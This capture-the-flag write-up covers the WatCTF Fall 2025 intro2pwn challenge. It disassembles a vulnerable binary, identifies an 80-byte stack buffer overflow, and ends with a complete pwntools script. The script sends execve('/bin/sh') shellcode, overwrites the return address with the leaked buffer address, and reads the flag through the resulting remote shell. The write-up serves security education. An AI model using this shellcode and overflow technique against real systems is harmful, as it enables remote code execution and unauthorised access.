# WatCTF Fall 2025 intro2pwn Writeup

An introductory pwn challenge; classic buffer overflow.

`nc challs.watctf.org 1991`

## Understanding

Can also run the `vuln` attachment locally.

```bash
$ file vuln 
vuln: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.10.0, not stripped
$ sudo chmod +x vuln 
$ ./vuln 
Addr: 0x7ffd7fb70d30
```

Let's see what we can learn about the `vuln` binary by decompiling it with `objdump`. Let's look for a `main` function.

```bash
$ objdump -d vuln | grep -A 20 "<main>"
```

```assembly
0000000000401750 <main>:
  401750:       55                      push   %rbp
  401751:       31 c0                   xor    %eax,%eax
  401753:       48 89 e5                mov    %rsp,%rbp
  401756:       e8 75 01 00 00          call   4018d0 <vuln>
  40175b:       31 c0                   xor    %eax,%eax
  40175d:       5d                      pop    %rbp
  40175e:       c3                      ret
  40175f:       90                      nop
```

`main` calls a function `vuln`

```bash
$ objdump -d vuln | grep -A 30 "<vuln>"
```

```assembly
00000000004018d0 <vuln>:
  4018d0:       55                      push   %rbp
  4018d1:       be 2c b0 49 00          mov    $0x49b02c,%esi
  4018d6:       bf 02 00 00 00          mov    $0x2,%edi
  4018db:       31 c0                   xor    %eax,%eax
  4018dd:       48 89 e5                mov    %rsp,%rbp
  4018e0:       53                      push   %rbx
  4018e1:       48 8d 5d b0             lea    -0x50(%rbp),%rbx
  4018e5:       48 89 da                mov    %rbx,%rdx
  4018e8:       48 83 ec 48             sub    $0x48,%rsp
  4018ec:       e8 ff 55 02 00          call   426ef0 <___printf_chk>
  4018f1:       48 8b 3d f8 4e 0c 00    mov    0xc4ef8(%rip),%rdi        # 4c67f0 <stdout>
  4018f8:       e8 c3 c6 00 00          call   40dfc0 <_IO_fflush>
  4018fd:       48 89 de                mov    %rbx,%rsi
  401900:       bf fa ce 49 00          mov    $0x49cefa,%edi
  401905:       31 c0                   xor    %eax,%eax
  401907:       e8 94 32 00 00          call   404ba0 <__isoc99_scanf>
  40190c:       48 8b 5d f8             mov    -0x8(%rbp),%rbx
  401910:       c9                      leave
  401911:       31 c0                   xor    %eax,%eax
  401913:       31 d2                   xor    %edx,%edx
  401915:       31 f6                   xor    %esi,%esi
  401917:       31 ff                   xor    %edi,%edi
  401919:       c3                      ret
  40191a:       66 0f 1f 44 00 00       nopw   0x0(%rax,%rax,1)
```

`lea    -0x50(%rbp),%rbx` is the buffer, `0x50` is 80 bytes.

When vuln() is called, the stack looks like this:

```
High addresses
+----------------+
| Return address | <- rbp + 8 (what we want to overwrite)
+----------------+
| Saved rbp      | <- rbp (current frame pointer)
+----------------+
| Saved rbx      | <- rbp - 8
+----------------+
|                |
|   Buffer       | <- rbp - 0x50 (80 bytes below rbp)
|   (80 bytes)   |
|                |
+----------------+
Low addresses
```


## Solution

``` python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

# Shell spawning exploit - this should give us a shell to run commands
p = remote('challs.watctf.org', 1991)

# Get buffer address
leak_line = p.recvline()
buffer_addr = int(leak_line.split(b': ')[1], 16)
print(f"Buffer address: {hex(buffer_addr)}")

offset = 88

# Simple shell spawning shellcode
shellcode = (
    # execve("/bin/sh", ["/bin/sh"], NULL)
    b'\x48\x31\xd2'               # xor rdx, rdx (envp = NULL)
    b'\x52'                       # push rdx (NULL)
    b'\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68'  # mov rax, "//bin/sh"
    b'\x50'                       # push rax
    b'\x48\x89\xe7'               # mov rdi, rsp (pathname)
    b'\x52'                       # push rdx (NULL for argv[1])
    b'\x57'                       # push rdi (pathname for argv[0])
    b'\x48\x89\xe6'               # mov rsi, rsp (argv)
    b'\x48\xc7\xc0\x3b\x00\x00\x00'  # mov rax, 59 (sys_execve)
    b'\x0f\x05'                   # syscall
)

print(f"Shellcode length: {len(shellcode)} bytes")

payload = shellcode + b'\x90' * (offset - len(shellcode)) + p64(buffer_addr)

print("Spawning shell...")
p.sendline(payload)

# Give it a moment to spawn
sleep(1)

print("Sending 'cat flag.txt' command...")
p.sendline(b'cat flag.txt')

# Try to get the output
try:
    response = p.recvrepeat(timeout=3)
    print(f"Response: {repr(response)}")
    
    response_str = response.decode('utf-8', errors='ignore')
    if 'watctf{' in response_str:
        flag_start = response_str.find('watctf{')
        flag_end = response_str.find('}', flag_start) + 1
        flag = response_str[flag_start:flag_end]
        print(f"\n🎉 FLAG CAPTURED: {flag}")
    else:
        print("Trying interactive mode...")
        p.interactive()
        
except Exception as e:
    print(f"Error: {e}")
    print("Trying interactive mode...")
    try:
        p.interactive()
    except:
        pass

p.close()
```